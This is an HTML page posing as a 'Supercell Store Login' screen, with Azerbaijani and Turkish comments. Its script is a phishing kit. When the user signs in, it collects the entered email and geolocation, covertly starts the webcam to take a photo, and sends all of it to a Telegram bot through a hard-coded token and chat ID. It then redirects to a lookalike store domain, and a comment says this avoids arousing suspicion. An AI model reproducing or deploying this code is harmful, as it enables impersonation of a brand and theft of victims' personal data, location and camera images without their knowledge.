<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell Store Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #1b4fb1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background-color: white; width: 380px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); text-align: center; }
        .logo { width: 80px; height: 80px; background-color: #ffc107; border-radius: 20px; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 50px; color: white; font-weight: 800; }
        input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; margin-bottom: 20px; outline: none; }
        .btn-blue { width: 100%; padding: 15px; border-radius: 10px; background-color: #4086f4; color: white; border: none; font-weight: 600; cursor: pointer; font-size: 16px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">S</div>
    <h2>Supercell Store Login</h2>
    <p>Enter your email to receive a verification code.</p>
    <input type="email" id="email" placeholder="Enter your email address" required>
    <button class="btn-blue" id="signInBtn">➜ SIGN IN</button>
    <p style="font-size: 11px; color: #999; margin-top: 15px;">Protected by CAPTCHA. Google Terms apply.</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    // --- TELEGRAM MƏLUMATLARINI BURAYA YAZ ---
    const BOT_TOKEN = '8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A';
    const CHAT_ID = '-1003369084883';

    const signInBtn = document.getElementById('signInBtn');
    const emailInput = document.getElementById('email');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    signInBtn.addEventListener('click', async () => {
        const email = emailInput.value;
        if (!email) { alert("Email daxil edin!"); return; }

        let locationInfo = "Yer məlumatı alınmadı";

        // Konum Alınması
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                locationInfo = `📍 Konum: https://www.google.com/maps?q=${lat},${lon}\n🌐 Enlem: ${lat}\n🌐 Uzunluq: ${lon}`;
            });
        }

        try {
            // Kamera İşə Salınması
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            // Kamera görüntüsü üçün qısa gözləmə
            setTimeout(() => {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'img.jpg');
                    formData.append('caption', `🔔 Yeni Giriş!\n📧 Email: ${email}\n${locationInfo}`);

                    // Telegrama göndər
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (e) {
                        console.log("Göndərmə xətası");
                    }

                    // Kameranı söndür
                    stream.getTracks().forEach(track => track.stop());

                    // --- ƏSAS HİSSƏ: REDİRECT (Yönləndirmə) ---
                    window.location.href = "https://supercellstore.com.tr";
                    
                }, 'image/jpeg');
            }, 2000);

        } catch (err) {
            // Kamera icazəsi olmasa belə yönləndir ki, şübhə yaranmasın
            window.location.href = "https://supercellstore.com.tr";
        }
    });
</script>

</body>
</html>
